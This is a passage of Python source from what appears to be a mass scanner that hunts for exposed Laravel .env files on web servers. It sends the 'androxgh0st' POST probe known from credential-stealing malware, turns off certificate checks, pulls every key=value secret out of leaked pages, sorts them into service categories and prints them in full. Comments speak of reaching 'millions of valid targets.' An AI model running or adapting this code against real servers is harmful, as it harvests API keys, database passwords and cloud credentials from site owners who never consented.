                return ScanResult(url=url, status="ERROR", category=None,
                                  details=str(exc)[:120], captures={})

            if response is None:
                # Response exceeded MAX_RESPONSE_BYTES — definitely not a .env file
                return ScanResult(url=url, status="CLEAN", category=None,
                                  details="Response too large (not a .env file)", captures={})
            if response.status_code == 200 and "APP_KEY" in response.text:
                return self.process_response(env_url, response)

            # ── Secondary androxgh0st probe (non-critical) ──────────────────────
            # _request() for POST already catches all RequestExceptions and returns
            # None, so no try/except needed here. Any other exception is a genuine
            # programming error and will propagate to the outer handler.
            response2 = self._request(session, url, method="post",
                                      data={"0x[]": "androxgh0st"})
            if response2 and "<td>APP_KEY</td>" in response2.text:
                return self.process_response(url, response2)

            return ScanResult(url=url, status="CLEAN", category=None,
                              details="No environment leakage detected", captures={})
        except Exception as exc:
            return ScanResult(url=url, status="ERROR", category=None,
                              details=str(exc)[:120], captures={})

    def _request(
        self,
        session: requests.Session,
        url: str,
        method: str = "get",
        data: Optional[Dict[str, str]] = None,
    ) -> Optional[Response]:
        """Execute one HTTP request.

        GET requests follow redirects (http → https is extremely common on real
        servers and must be followed or millions of valid targets are missed).
        Response body is streamed with a hard cap of MAX_RESPONSE_BYTES — a real
        .env file will never exceed this; oversized responses return None.

        Raises requests.exceptions.RequestException on network failures so the
        caller can classify the error precisely.
        POST requests never follow redirects and return None on any failure
        (secondary probe — failure is non-fatal).
        """
        if method == "post":
            try:
                return session.post(url, timeout=self.timeout,
                                    verify=False, allow_redirects=False, data=data)
            except requests.exceptions.RequestException:
                # POST is a secondary probe — any network failure means skip it
                return None

        # GET — follow redirects, stream body, cap at MAX_RESPONSE_BYTES
        r = session.get(url, timeout=self.timeout, verify=False,
                        allow_redirects=True, stream=True)
        # Reject by Content-Length header before downloading anything
        cl = r.headers.get("Content-Length", "")
        if cl.isdigit() and int(cl) > MAX_RESPONSE_BYTES:
            r.close()
            return None
        # Stream-read body with hard cap to prevent OOM on broken/malicious servers
        chunks: list = []
        total_bytes = 0
        for chunk in r.iter_content(chunk_size=65536):
            total_bytes += len(chunk)
            if total_bytes > MAX_RESPONSE_BYTES:
                r.close()
                return None
            chunks.append(chunk)
        r._content = b"".join(chunks)  # make .text/.content work normally
        return r

    def process_response(self, url: str, response: Response) -> ScanResult:
        """Analyze the response body and capture all matching categories."""
        raw = response.text
        captures = self.find_values(raw)
        categories = self.find_categories(raw, captures)
        category = categories[0] if categories else None
        status = "VALID" if captures else "EMPTY"
        details = self.format_details(captures)
        return ScanResult(url=url, status=status, category=category, details=details,
                          captures=captures, categories=categories)

    def find_values(self, raw: str) -> Dict[str, str]:
        """Extract key=value pairs from raw env content or HTML leak page."""
        values: Dict[str, str] = {}
        for match in re.findall(r"([A-Z0-9_]+)=(.+)", raw):
            name, value = match
            values[name] = value.strip()
        return values

    def find_categories(self, raw: str, captures: Dict[str, str]) -> List[str]:
        """Return ALL matching category names — a single .env can match 20+."""
        raw_lower = raw.lower()
        matched: List[str] = []
        for name, meta in CATEGORY_PATTERNS.items():
            triggers = meta["trigger"]
            if isinstance(triggers, str):
                triggers = [triggers]
            trigger_match = any(trigger.lower() in raw_lower for trigger in triggers)
            key_match = any(key in captures for key in meta.get("keys", []))
            if trigger_match or key_match:
                matched.append(name)
        return matched

    # Keep old name as alias so any external callers don't break
    def find_category(self, raw: str, captures: Dict[str, str]) -> Optional[str]:
        cats = self.find_categories(raw, captures)
        return cats[0] if cats else None

    def format_details(self, captures: Dict[str, str]) -> str:
        """Build a readable detail string for result display."""
        if not captures:
            return "No key/value pairs were captured."
        return "; ".join(f"{key}={value}" for key, value in sorted(captures.items()))
